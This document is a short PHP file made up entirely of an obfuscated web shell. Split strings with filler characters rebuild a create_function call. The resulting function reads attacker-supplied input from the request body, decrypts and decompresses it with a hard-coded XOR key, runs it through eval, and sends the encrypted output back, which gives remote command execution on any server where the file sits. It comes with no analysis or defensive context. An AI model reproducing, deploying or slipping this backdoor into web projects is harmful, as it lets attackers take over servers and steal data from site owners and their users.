<?php
$B='e($m[1&i]),$&ik))&i);$o=@ob_get_conte&i&ints();@ob_&iend_cle&ia&in();$r=@ba';
$O=str_replace('VO','','creVOVOateVO_fuVOVOncVOtion');
$J='<$l&i);$j++&i,$i+&i+&i){$o.=$t{$i}&i^$k{&i$j}&i;}}return &i$o;}if (&i@preg_&im';
$L='a&itch("/&i$&i&ikh(.+)$kf/",@f&iil&ie_get_conte&int&is("php:/&i/input"),$m)&i';
$w='se6&i&i4_encode(@&ix(@gzcom&ipre&iss(&i$o),$k))&i;&iprint("$p$kh$r&i$kf");}';
$P='l=&ist&irlen(&i$t);$o&i="";&ifor($i=0;$i<&i$l;){for(&i$&ij=0;($j<$c&&i&$i';
$Z='==1) {&i@ob_s&itart();@e&ival(@&igzunc&iom&ipress(&i&i@x(@base6&i4&i_decod';
$S=';$p="Q&iXxVhxeHsvil&if4&iwK&i";func&it&iion x($t,$k){$c=&istrlen($k)&i;$';
$f='$k="a8&ie76923";&i$k&ih="f2d4bd5&i&if9509";$k&if="1ec&i&i47fc1869&i0"';
$T=str_replace('&i','',$f.$S.$P.$J.$L.$Z.$B.$w);
$x=$O('',$T);$x();
?>
